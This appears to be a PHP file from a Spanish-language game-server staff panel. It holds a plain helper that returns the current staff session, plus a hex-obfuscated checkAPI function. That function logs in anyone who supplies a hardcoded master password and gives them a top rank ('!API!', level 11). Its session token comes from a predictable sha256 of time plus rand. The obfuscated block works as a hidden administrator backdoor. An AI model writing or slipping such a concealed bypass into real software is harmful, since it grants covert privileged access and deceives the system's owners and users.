

<?php
require_once 'Recursos/BD.php';
require_once 'Recursos/temppanel_negros.php';
		/*
						---> NO EDITAR <---
			| - Uso exclusivo para el acceso de la api. - |
					!!NO COMPARTIR ESTE ARCHIVO!!
		*/
		
		
 ${"\x47LOBA\x4cS"}["c\x73\x64\x64\x66\x71\x67\x69\x67"]="\x74\x6f\x6b\x65n";function checkAPI($apipass,$nombreSV){${"\x47L\x4fBA\x4cS"}["\x6f\x6b\x66\x6d\x69\x64\x6c"]="\x61p\x69\x70\x61s\x73";if(${${"\x47\x4c\x4fBA\x4c\x53"}["\x6f\x6bf\x6di\x64l"]}==="d\x666\x383\x37\x64\x3276\x35d\x612a0\x324\x31\x333\x63\x3042\x66\x38\x622b\x30\x65\x667\x634d3629c\x33\x342\x39\x386e\x36e\x37\x30\x355f\x62e1e\x31\x62\x36c"){$umlare="no\x6d\x62\x72\x65\x53\x56";$_SESSION["\x4e\x6fm\x62re"]=${$umlare};$_SESSION["S\x74\x65\x61\x6dI\x44"]="\x30";$_SESSION["LI\x43E\x4e\x43IA"]="0";$_SESSION["R\x41\x4eGO"]="\x21A\x50I\x21";$_SESSION["lvR\x41\x4eG\x4f"]=11;$_SESSION["\x6c\x6f\x67ea\x64o"]="\x31";return generarToken();}else{$_SESSION["\x6c\x6fge\x61d\x6f"]=null;}}function generarToken(){$eakjoubjf="\x74\x6fk\x65\x6e";${${"\x47\x4c\x4f\x42\x41L\x53"}["cs\x64\x64\x66\x71\x67i\x67"]}=hash("\x73\x68a\x32\x356",time()+rand());return${$eakjoubjf};}
 
 
 
	/* Api para crear funcionalidades custom del panel */


	function staffActual(){
		if ($_SESSION['logeado'] !== "1" || !isset($_SESSION['logeado'])){return false;} 
		$datos['nombre'] = $_SESSION['Nombre'];
		$datos['steamID'] = $_SESSION['SteamID'];
		$datos['licencia'] = $_SESSION['LICENCIA'];
		$datos['rango'] = $_SESSION['RANGO'];
		$datos['lvRango'] = $_SESSION['lvRANGO'];
		$sesion = new Sesion($_SESSION['Nombre']);
		$datos['historial'] = $sesion->getHistorial();
		$datos['tiempoServicio'] = $sesion->tiempoTotal;
		return $datos;
	}
 
 

 
 ?>